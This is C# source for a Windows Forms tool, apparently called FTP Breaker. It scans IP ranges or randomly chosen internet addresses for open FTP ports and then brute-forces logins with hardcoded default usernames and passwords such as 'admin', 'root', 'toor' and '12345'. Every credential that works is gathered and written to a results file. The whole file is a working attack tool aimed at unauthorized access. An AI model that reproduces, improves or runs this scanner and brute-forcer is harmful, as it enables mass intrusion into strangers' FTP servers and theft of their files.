using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Threading;
using System.Net.Sockets;
using System.Web;
using System.Net.WebSockets;
using System.Net.Http;

namespace Q_FTPBREAKER_GUI
{
    //MADE BY ATERRAGON
    //HECHO POR ATERRAGON
    //MADE BY  secleGhost
    //HECHO POR  secleGhost
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public static string ip1;
        public static bool iniciar;
        public static List<string> final = new List<string>();
        public static string Timeout;
        public static string threads;
        public static string[] resultado;
        public static bool desicion;
        public static string cantidad;
        public static string ftpseconds;
        public static int totales;
        public static int cuenta;
        public static string[] salida;
        public static bool finalizar;
        public static bool refrescar;
        public static List<string> salidaip = new List<string>();
        public static int buenos;
        public static int ftpgood;
        public static int ftpbad;
        public static int ftpultimo;

        public void Hilo(object G)
        {
            dynamic Z = G;
            int inicio = Z.A;
            string[] ip = Z.B;
            int final = Z.C;
            int timeout = Z.D;

            string A = null;

            for (int i = inicio; i < final; i++)
            {
                ++cuenta;
                Regreso1(ip[i]);
                if (checkBox4.CheckState == CheckState.Checked)
                {
                    break;
                }
                TcpClient tcp = new TcpClient();
                try
                {
                    tcp.ConnectAsync(ip[i], 21).Wait(timeout);
                    if (tcp.Connected)
                    {
                        Thread hilo = new Thread(new ParameterizedThreadStart(HILO1));
                        A = ip[i];
                        hilo.Start(new { A });
                        buenos++;
                    }
                    else
                    {
                    }
                }
                catch (Exception)
                {
                }
            }

            Thread.Sleep(100000000);
        }

        public static string Regreso1(string ip5)
        {
            try
            {
                salidaip.Add(ip5);
            }
            catch
            {
            }
            return ip5;
        }

        public void HILO1(object X)
        {
            dynamic V = X;
            string ip = V.A;
            string[] usuario = { "ftp", "anonymous", "admin", "guest" };//USER BRUTERFORCE
            string[] contrasenas = { "ftp", "password", "root", "admin", "toor", "12345", "guest" };//PASSWORD BRUTERFORCE
            string a = "ftp://" + ip;
            bool pass = false;
            bool cuenta = true;
            int ftpseg = Convert.ToInt32(ftpseconds);

            for (int i = 0; i < usuario.Length; i++)
            {
                for (int b = 0; b < contrasenas.Length; b++)
                {
                    if (checkBox4.CheckState == CheckState.Checked)
                    {
                        break;
                    }
                    if (checkBox4.CheckState == CheckState.Checked)
                    {
                        break;
                    }
                    try
                    {
                        FtpWebRequest request = (FtpWebRequest)WebRequest.Create(a);
                        request.Timeout = ftpseg * 1000;//Timeout ftp
                        request.Method = WebRequestMethods.Ftp.ListDirectory;
                        request.Credentials = new NetworkCredential(usuario[i], contrasenas[b]);
                        request.GetResponse();
                        Regreso(a + ":" + usuario[i] + "@" + contrasenas[b]);
                        pass = true;
                        cuenta = true;
                        ++ftpgood;
                        break;
                    }
                    catch
                    {
                    }
                }
                if (pass == true)
                {
                    break;
                }
            }
            if (cuenta == false)
            {
                ++ftpbad;
            }

            Thread.Sleep(100000000);
        }

        public static string Regreso(string ip)
        {
            try
            {
                final.Add(ip);
            }
            catch
            {
            }
            return ip;
        }

        public static string[] L()
        {
            return final.ToArray();
        }

        public void textBox1_TextChanged(object sender, EventArgs e)//rango
        {
            ip1 = Convert.ToString(rango.Text);
        }

        private void button1_Click(object sender, EventArgs e)//iniciar
        {
            final.Clear();
            salidaip.Clear();
            buenos = 0;
            totales = 0;
            cuenta = 0;
            ftpbad = 0;
            ftpgood = 0;
            textBox3.Clear();
            textBox3.Refresh();
            textBox5.Clear();
            textBox5.Refresh();
            Application.DoEvents();
            if (desicion == false)
            {
                char deli = '-';
                char deli1 = '.';
                string[] a = ip1.Split(deli);
                int timeout = 0;
                int.TryParse(Timeout, out timeout);
                int hilos = 0;
                int.TryParse(threads, out hilos);
                int[] ab = Array.ConvertAll(a[0].Split(deli1), int.Parse);
                int[] ac = Array.ConvertAll(a[1].Split(deli1), int.Parse);
                int a1 = (ac[0] - ab[0]) * 16777216;
                int a2 = (ac[1] - ab[1]) * 65536;
                int a3 = (ac[2] - ab[2]) * 256;
                int a4 = ac[3] - ab[3];
                int total = a1 + a2 + a3 + a4;
                totales = total;
                resultado = new string[total];
                resultado[0] = Convert.ToString(ab[0] + "." + ab[1] + "." + ab[2] + "." + ab[3]);

                for (int i = 1; i < total; i++)
                {
                    if (ab[0] == ac[0] && ab[1] == ac[1] && ab[2] == ac[2] && ab[3] == ab[3])
                    {
                        break;
                    }
                    ++ab[3];
                    if (ab[3] == 256 && ab[2] != 255)
                    {
                        ++ab[2];
                        ab[3] = 0;
                    }
                    else if (ab[1] != 255 && ab[2] == 255 && ab[3] == 256)

                    {
                        ++ab[1];
                        ab[2] = 0;
                        ab[3] = 0;
                    }
                    else if (ab[1] == 255 && ab[2] == 255 && ab[3] == 256)
                    {
                        ++ab[0];
                        ab[1] = 0;
                        ab[2] = 0;
                        ab[3] = 0;
                    }

                    resultado[i] = Convert.ToString(ab[0] + "." + ab[1] + "." + ab[2] + "." + ab[3]);
                }

                for (int i = 0; i < hilos; i++)
                {
                    Thread hilo = new Thread(new ParameterizedThreadStart(Hilo));
                    if (i == hilos - 1)
                    {
                        int A = (resultado.Length / hilos) * i;
                        string[] B = resultado;
                        int C = resultado.Length;
                        int D = timeout * 1000;
                        hilo.Start(new { A, B, C, D });
                    }
                    else
                    {
                        int A = (resultado.Length / hilos) * i;
                        string[] B = resultado;
                        int C = (resultado.Length / hilos) * (i + 1);
                        int D = timeout * 1000;
                        hilo.Start(new { A, B, C, D });
                    }
                }
            }
            else if (desicion == true)
            {
                Random aleatorios = new Random();
                int timeout = 0;
                int.TryParse(Timeout, out timeout);
                int hilos = 0;
                int.TryParse(threads, out hilos);
                int numeroips = Convert.ToInt32(cantidad);
                totales = numeroips;
                resultado = new string[numeroips];
                for (int i = 0; i < numeroips; i++)
                {
                    string ip1 = Convert.ToString(aleatorios.Next(0, 256));
                    string ip2 = Convert.ToString(aleatorios.Next(0, 256));
                    string ip3 = Convert.ToString(aleatorios.Next(0, 256));
                    string ip4 = Convert.ToString(aleatorios.Next(0, 256));

                    resultado[i] = ip1 + "." + ip2 + "." + ip3 + "." + ip4;
                }

                for (int i = 0; i < hilos; i++)
                {
                    Thread hilo = new Thread(new ParameterizedThreadStart(Hilo));
                    if (i == hilos - 1)
                    {
                        int A = (resultado.Length / hilos) * i;
                        string[] B = resultado;
                        int C = resultado.Length;
                        int D = timeout * 1000;
                        hilo.Start(new { A, B, C, D });
                    }
                    else
                    {
                        int A = (resultado.Length / hilos) * i;
                        string[] B = resultado;
                        int C = (resultado.Length / hilos) * (i + 1);
                        int D = timeout * 1000;
                        hilo.Start(new { A, B, C, D });
                    }
                }
            }
            if (totales > 1000)
            {
                checkBox2.CheckState = CheckState.Unchecked;
            }
            label11.Text = totales.ToString();
            label11.Refresh();
            Application.DoEvents();
            int time1 = Convert.ToInt32(Timeout);
            int conteofinal = 0;

            int detener = 0;
            int detener1 = 0;
            int detener2 = 0;
            do
            {
                try
                {
                    conteofinal = salidaip.Count();

                    if (conteofinal < totales)
                    {
                        label9.Text = conteofinal.ToString();
                        label9.Refresh();
                        label13.Text = Convert.ToString(buenos);
                        label13.Refresh();
                    }
                    else if (detener1 < 1)
                    {
                        ++detener;
                        ++detener1;
                    }
                    else if (detener2 < 1)
                    {
                        label9.Text = totales.ToString();
                        label9.Refresh();
                        Application.DoEvents();
                    }
                    textBox5.Text = string.Join(Environment.NewLine, final);
                    textBox5.Refresh();
                    label16.Text = Convert.ToString(ftpgood);
                    label16.Refresh();
                    label17.Text = Convert.ToString(ftpbad);
                    label17.Refresh();

                    if (checkBox2.CheckState == CheckState.Checked)
                    {
                        textBox3.Text = string.Join(Environment.NewLine, salidaip);
                        textBox3.Refresh();
                    }
                }
                catch (Exception)
                {
                }

                Application.DoEvents();
                Thread.Sleep(time1 * 1000);
            } while (checkBox4.CheckState == CheckState.Unchecked);
            string cn = final.Count.ToString();
            if (final.Count == 0)
            {
                MessageBox.Show(conteofinal.ToString(), "Error");
            }
            else
            {
                MessageBox.Show(conteofinal.ToString(), "Error");
            }
        }

        public void label1_Click(object sender, EventArgs e)
        {
        }

        private void label3_Click(object sender, EventArgs e)
        {
        }

        public void textBox2_TextChanged(object sender, EventArgs e)//timeout
        {
            Timeout = Convert.ToString(time.Text);
        }

        private void label4_Click(object sender, EventArgs e)
        {
        }

        public void textBox1_TextChanged_1(object sender, EventArgs e)//Threads
        {
            threads = Convert.ToString(textBox1.Text);
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)//ip aleatorio desicion
        {
            desicion = Convert.ToBoolean(checkBox1.Checked);

            if (desicion == false)
            {
                rango.Enabled = true;
            }
            else
            {
                rango.Enabled = false;
            }
        }

        private void textBox2_TextChanged_1(object sender, EventArgs e)//numero de ip aleatorios
        {
            cantidad = Convert.ToString(textBox2.Text);
        }

        private void label7_Click(object sender, EventArgs e)
        {
        }

        private void textBox4_TextChanged(object sender, EventArgs e)//ftp seconds
        {
            ftpseconds = Convert.ToString(textBox4.Text);
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)//mostrar procesos
        {
        }

        private void label11_Click(object sender, EventArgs e)//total de ip
        {
        }

        public void label9_Click(object sender, EventArgs e)//conteo de ip
        {
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        private void label10_Click(object sender, EventArgs e)
        {
        }

        private void label5_Click(object sender, EventArgs e)
        {
        }

        private void label9_MouseMove(object sender, MouseEventArgs e)
        {
        }

        private void label11_MouseMove(object sender, MouseEventArgs e)
        {
        }

        public void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {
        }

        private void textBox5_TextChanged(object sender, EventArgs e)
        {
        }

        private void textBox3_Validated(object sender, EventArgs e)
        {
        }

        private void textBox3_MultilineChanged(object sender, EventArgs e)
        {
        }

        private void textBox3_MouseLeave(object sender, EventArgs e)
        {
        }

        private void textBox3_Leave(object sender, EventArgs e)
        {
        }

        private void textBox3_TextChanged_1(object sender, EventArgs e)
        {
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox3.CheckState == CheckState.Checked)
            {
                checkBox3.Text = "Auto Refresh IP List";
            }
            else if (checkBox3.CheckState == CheckState.Unchecked)
            {
                checkBox3.Text = "Auto Refresh IP List";
            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            Random aleatoria = new Random();
            char v = (char)aleatoria.Next('a', 'z');
            string[] finallista = new string[totales];
            finallista = final.ToArray();
            string path = @".\result-" + v + ".txt";
            bool ultimo = false;
            try
            {
                if (!String.IsNullOrEmpty(finallista[0]))
                {
                    File.WriteAllLines(path, finallista);
                    ultimo = true;
                }
            }
            catch (Exception)
            {
                MessageBox.Show("No results", "Error");
            }
            if (ultimo == false)
            {
                MessageBox.Show("No results", "Error");
            }
        }

        private void label13_Click(object sender, EventArgs e)
        {
        }

        private void label16_Click(object sender, EventArgs e)
        {
        }

        private void label17_Click(object sender, EventArgs e)
        {
        }

        public void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
        }

        private void button2_Click(object sender, EventArgs e)
        {
        }

        private void checkBox2_CheckedChanged_1(object sender, EventArgs e)
        {
        }
    }
}